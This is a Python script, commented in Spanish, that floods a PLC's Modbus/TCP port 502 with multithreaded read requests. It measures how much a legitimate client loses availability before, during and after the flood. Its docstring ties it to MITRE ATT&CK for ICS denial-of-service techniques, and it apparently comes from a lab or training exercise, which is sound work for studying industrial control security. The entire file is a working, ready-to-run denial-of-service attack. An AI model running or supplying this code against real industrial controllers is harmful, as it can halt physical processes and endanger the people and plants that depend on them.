#!/usr/bin/env python3
"""Ataque - Denegacion de Servicio (DoS) por inundacion Modbus/TCP.
MITRE ATT&CK for ICS: T0814 (Denial of Service) / impacto T0826 (Loss of Availability).

Desde la estacion atacante (Parrot) satura el PLC con peticiones Modbus a alta
velocidad usando multiples hilos, y mide el impacto en la disponibilidad del
dispositivo (latencia/exito de un cliente legitimo antes y durante la inundacion).

Uso: python3 dos_modbus.py <ip_plc> [duracion_seg] [hilos]
"""
import sys, socket, time, threading

# Peticion Read Holding Registers (fc=3, addr=0, count=5): MBAP + PDU
REQ = bytes.fromhex("000100000006010300000005")

sent = 0
lock = threading.Lock()

def flood(ip, deadline):
    global sent
    local = 0
    while time.time() < deadline:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((ip, 502))
            for _ in range(20):
                if time.time() >= deadline: break
                s.send(REQ)
                local += 1
            s.close()
        except Exception:
            pass
    with lock:
        sent += local

def probe_legit(ip):
    """Mide la latencia/exito de una lectura legitima (impacto en disponibilidad)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        t0 = time.time()
        s.connect((ip, 502))
        s.send(REQ)
        data = s.recv(256)
        dt = (time.time() - t0) * 1000
        s.close()
        return (True, dt) if data else (False, dt)
    except Exception as e:
        return (False, None)

def main(ip, dur=8, threads=30):
    print(f"== DoS por inundacion Modbus contra {ip}:502 ==")
    print("MITRE ATT&CK for ICS: T0814 (Denial of Service) - impacto T0826 (Loss of Availability)")
    print(f"Duracion: {dur}s | Hilos: {threads}")
    ok, dt = probe_legit(ip)
    print(f"[BASELINE] lectura legitima antes del ataque: {'OK' if ok else 'FALLO'}"
          + (f" ({dt:.1f} ms)" if dt else ""))
    deadline = time.time() + dur
    ts = [threading.Thread(target=flood, args=(ip, deadline)) for _ in range(threads)]
    t0 = time.time()
    for t in ts: t.start()
    # Sondeos de disponibilidad DURANTE el ataque
    time.sleep(dur/2)
    ok2, dt2 = probe_legit(ip)
    print(f"[DURANTE]  lectura legitima durante el ataque: {'OK' if ok2 else 'FALLO/TIMEOUT'}"
          + (f" ({dt2:.1f} ms)" if dt2 else " (sin respuesta)"))
    for t in ts: t.join()
    elapsed = time.time() - t0
    print(f"\nTotal de peticiones enviadas: {sent}")
    print(f"Tasa de inundacion: {sent/elapsed:.0f} req/s durante {elapsed:.1f}s")
    ok3, dt3 = probe_legit(ip)
    print(f"[DESPUES]  lectura legitima tras el ataque: {'OK' if ok3 else 'FALLO'}"
          + (f" ({dt3:.1f} ms)" if dt3 else ""))
    if ok and not ok2:
        print("\n>>> IMPACTO: el PLC dejo de responder a clientes legitimos durante la inundacion (perdida de disponibilidad).")
    elif ok and ok2 and dt and dt2 and dt2 > dt*3:
        print(f"\n>>> IMPACTO: la latencia legitima se degrado {dt2/dt:.1f}x durante la inundacion.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Uso: python3 {sys.argv[0]} <ip_plc> [duracion_seg] [hilos]"); sys.exit(1)
    ip = sys.argv[1]
    dur = int(sys.argv[2]) if len(sys.argv) > 2 else 8
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 30
    main(ip, dur, threads)
